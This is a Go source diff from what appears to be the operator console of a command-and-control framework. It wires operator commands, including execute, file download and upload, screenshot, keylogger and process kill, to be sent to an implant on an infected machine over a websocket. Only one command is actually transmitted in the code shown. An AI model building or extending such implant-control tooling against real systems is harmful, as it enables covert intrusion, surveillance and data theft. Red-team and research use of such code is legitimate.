@@ -68,10 +68,10 @@ func ParseImplantCommand(Command string) {
 		PrevCmd = "\n> " + cmd + "\n"
 	}
 
-	switch cmd {
+	switch strings.ToLower(cmd) {
 	case "help":
 		if subcmd != "" {
-			switch subcmd {
+			switch strings.ToLower(subcmd) {
 			case "execute":
 				menuobj.ImplantLog.SetText(menuobj.PreviousText + PrevCmdWSub + "Execute Command Help:\n" +
 					"Execute a command on the implant.\n" +
@@ -216,60 +216,109 @@ func ParseImplantCommand(Command string) {
 
 	case "execute":
 		//execute a command on the implant.
-		SendImplantCommand(cmd, args)
+		SendImplantCommand(cmd, args, ImplantName)
 		break
 	case "exec":
+		SendImplantCommand(cmd, args, ImplantName)
 		break
 	case "download":
 		//download a file from the target pc implant is infecting.
+		SendImplantCommand(cmd, args, ImplantName)
 		break
 	case "upload":
 		//upload a file to the target pc implant is infecting.
+		SendImplantCommand(cmd, args, ImplantName)
 		break
 	case "screenshot":
 		//take a screenshot of the desktop.
+		SendImplantCommand(cmd, args, ImplantName)
 		break
 	case "keylogger":
 		//start / stop keylogger on implant. This will be a reflected application loaded into memory.
+		SendImplantCommand(cmd, args, ImplantName)
 		break
 	case "shutdown":
 		//kill the implant.
+		SendImplantCommand(cmd, args, ImplantName)
 		break
 	case "sleep":
 		//set new sleep time on implant
+		SendImplantCommand(cmd, args, ImplantName)
 		break
 	case "list":
 		//list all files in the current directory.
+		SendImplantCommand(cmd, args, ImplantName)
+		break
+	case "ls":
+		SendImplantCommand(cmd, args, ImplantName)
+		break
+	case "dir":
+		SendImplantCommand(cmd, args, ImplantName)
 		break
 	case "cd":
 		//change directory on implant.
+		SendImplantCommand(cmd, args, ImplantName)
 		break
 	case "pwd":
 		//print working directory on implant.
+		SendImplantCommand(cmd, args, ImplantName)
 		break
 	case "ps":
 		//list all running processes on implant.
+		SendImplantCommand(cmd, args, ImplantName)
 		break
 	case "kill":
 		//kill a process on the implant.
+		SendImplantCommand(cmd, args, ImplantName)
 		break
 	case "lm":
 		//list all loaded modules on the implant.
+		SendImplantCommand(cmd, args, ImplantName)
 		break
 	case "clear":
 		menuobj.ImplantLog.SetText("")
 		break
 
-	default:
+	default: //no recognized command print the help menu
+		menuobj.ImplantLog.SetText(menuobj.PreviousText + PrevCmd + HelpMenuString)
 		break
 	}
 
+	textlength := len(menuobj.ImplantLog.Text)
+	menuobj.ImplantLog.CursorRow = textlength
+	menuobj.ImplantLog.Refresh()
+
 }
 
-func SendImplantCommand(Command string, args []string) {
-	switch Command {
-	case "help":
+func SendImplantCommand(Command string, args []string, ImplantName string) {
+	var (
+		WSMessage = Common.WebSocketMessage{
+			MessageType: "ImplantCommand",
+			Message:     "",
+		}
+		ImplantCmdData Common.ImplantCommandData
+	)
+	ImplantCmdData.ImplantName = ImplantName
+	ImplantCmdData.Command = Command
+	ImplantCmdData.Args = args
 
+	JData, err := json.Marshal(ImplantCmdData)
+	if err != nil {
+		log.Println("[error] attempting to marshal json data. [SendImplantCommand]:", err)
+		return
+	}
+	WSMessage.Message = string(JData)
+
+	switch Command {
+	case "lm":
+		//list all loaded modules on the implant.
+		err = g_clientobj.Conn.WriteJSON(WSMessage)
+		if err != nil {
+			log.Println("[error] attempting to send implant command to the server websocket.", err)
+		}
+
+	default:
+		break
 	}
 }
 
